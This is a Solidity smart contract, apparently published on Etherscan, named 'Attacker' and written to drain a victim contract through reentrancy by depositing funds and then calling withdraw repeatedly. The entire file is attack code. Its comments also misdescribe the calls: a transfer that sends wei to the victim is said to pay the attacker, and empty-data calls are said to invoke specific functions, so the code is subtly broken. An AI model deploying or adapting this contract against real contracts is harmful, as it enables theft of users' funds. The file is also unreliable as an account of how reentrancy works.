/**
 *Submitted for verification at Etherscan.io on 2023-03-07
*/

pragma solidity ^0.8.0;

/// The attacker contract
contract Attacker {
    // Address of the victim contract
    address payable public victimAddress;

    // Constructor function that sets the victim contract address
    constructor(address payable _victimAddress) {
        victimAddress = _victimAddress;
    }

    // Fallback function that calls the victim contract's transfer function
    fallback() external payable {
        // Call the transfer function of the victim contract
        (bool success, ) = victimAddress.call{value: 0}("");
        require(success, "Attack failed");

        // Call the withdraw function of the victim contract, triggering the reentrancy attack
        victimAddress.call{value: 0}("");
    }

    // Attack function that triggers the reentrancy attack
    function attack() public payable {
        // Call the transfer function of the victim contract, transferring 100 wei to the attacker contract
        victimAddress.transfer(100);

        // Call the fallback function of the attacker contract, triggering the reentrancy attack
        victimAddress.call{value: 0}("");
    }

    function performAttack() external payable {
        // Call the victim contract's deposit function to start the attack
        (bool success, ) = victimAddress.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(success, "Attack failed");
        
        // Call the victim contract's withdraw function repeatedly to trigger the reentrancy attack
        for (uint256 i = 0; i < 10; i++) {
            (success, ) = victimAddress.call{value: 0}(abi.encodeWithSignature("withdraw(uint256)", 1));
            require(success, "Attack failed");
        }
    }
}